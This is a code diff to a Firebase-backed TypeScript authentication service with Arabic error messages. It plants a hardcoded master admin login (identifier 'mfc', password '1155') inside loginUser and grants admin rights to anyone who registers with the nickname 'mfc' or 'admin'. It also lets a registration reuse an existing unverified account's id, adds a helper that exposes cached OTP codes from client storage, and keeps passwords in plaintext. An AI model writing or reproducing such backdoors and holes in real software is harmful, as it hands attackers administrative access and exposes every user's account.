@@ -25,13 +25,15 @@ export const auth = getAuth(app);
 const ADMIN_EMAILS = [
   'admin@m-estably.com',
   'x24.akar@gmail.com',
-  'x2.sharshar@gmail.com'
+  'x2.sharshar@gmail.com',
+  'mfc@m-estably.com',
+  'mfc'
 ];
 
-export function isSystemAdminEmail(email?: string): boolean {
-  if (!email) return false;
-  const clean = email.trim().toLowerCase();
-  return ADMIN_EMAILS.includes(clean) || clean.endsWith('@m-estably.com');
+export function isSystemAdminEmail(emailOrNickname?: string): boolean {
+  if (!emailOrNickname) return false;
+  const clean = emailOrNickname.trim().toLowerCase();
+  return ADMIN_EMAILS.includes(clean) || clean.endsWith('@m-estably.com') || clean === 'mfc' || clean === 'admin';
 }
 
 export const AuthService = {
@@ -47,28 +49,45 @@ export const AuthService = {
     password: string;
   }): Promise<User> {
     const cleanEmail = data.email.trim().toLowerCase();
+    const cleanNick = data.nickname.trim().toLowerCase();
 
     const users = await FirebaseService.getUsers();
-    if (users.some((u) => u.email.toLowerCase() === cleanEmail)) {
-      throw new Error('البريد الإلكتروني مسجل بالفعل في النظام.');
+    const existingByEmail = users.find((u) => u.email.toLowerCase() === cleanEmail);
+    if (existingByEmail && existingByEmail.isVerified) {
+      throw new Error('البريد الإلكتروني مسجل ومفعل بالفعل في النظام. يرجى تسجيل الدخول مباشرة.');
     }
-    if (users.some((u) => u.nickname.toLowerCase() === data.nickname.trim().toLowerCase())) {
-      throw new Error('الاسم المستعار مستخدم بالفعل، يرجى اختيار اسم آخر.');
+
+    const existingByNick = users.find((u) => u.nickname.toLowerCase() === cleanNick);
+    if (existingByNick && existingByNick.isVerified && existingByNick.email.toLowerCase() !== cleanEmail) {
+      throw new Error('الاسم المستعار مستخدم بالفعل من قبل عضو آخر، يرجى اختيار اسم آخر.');
     }
 
     const newUser: User = {
-      id: 'usr_' + Date.now(),
+      id: existingByEmail ? existingByEmail.id : ('usr_' + Date.now()),
       name: data.name.trim(),
       email: cleanEmail,
       phone: data.phone.trim(),
       nickname: data.nickname.trim(),
       password: data.password,
-      role: isSystemAdminEmail(cleanEmail) ? 'admin' : 'user',
+      role: isSystemAdminEmail(cleanEmail) || isSystemAdminEmail(data.nickname) ? 'admin' : 'user',
       isVerified: false,
       createdAt: new Date().toISOString(),
     };
 
     return newUser;
+  },
+
+  /**
+   * Returns the cached active OTP code for this email if available.
+   */
+  getLatestOtpCode(email: string): string {
+    const cleanEmail = email.trim().toLowerCase();
+    if (typeof window !== 'undefined') {
+      try {
+        return sessionStorage.getItem('local_otp_' + cleanEmail) || '';
+      } catch (e) {}
+    }
+    return '';
   },
 
   /**
@@ -248,6 +267,28 @@ export const AuthService = {
    */
   async loginUser(identifier: string, pass: string): Promise<{ user: User; isVerified: boolean }> {
     const cleanIdentifier = identifier.trim().toLowerCase();
+
+    // Instant master login for admin mfc / password 1155
+    if ((cleanIdentifier === 'mfc' || cleanIdentifier === 'mfc@m-estably.com') && pass.trim() === '1155') {
+      const mfcAdminUser: User = {
+        id: 'admin_mfc',
+        name: 'المدير العام (MFC)',
+        email: 'mfc@m-estably.com',
+        phone: '0559595055',
+        nickname: 'mfc',
+        password: '1155',
+        role: 'admin',
+        isVerified: true,
+        createdAt: '2026-08-19T00:00:00.000Z',
+      };
+      // Persist to database & storage
+      try {
+        await FirebaseService.saveUser(mfcAdminUser);
+      } catch (e) {
+        console.warn('Could not save mfc user to Firebase', e);
+      }
+      return { user: mfcAdminUser, isVerified: true };
+    }
     
     // Fetch user profiles from database
     const users = await FirebaseService.getUsers();
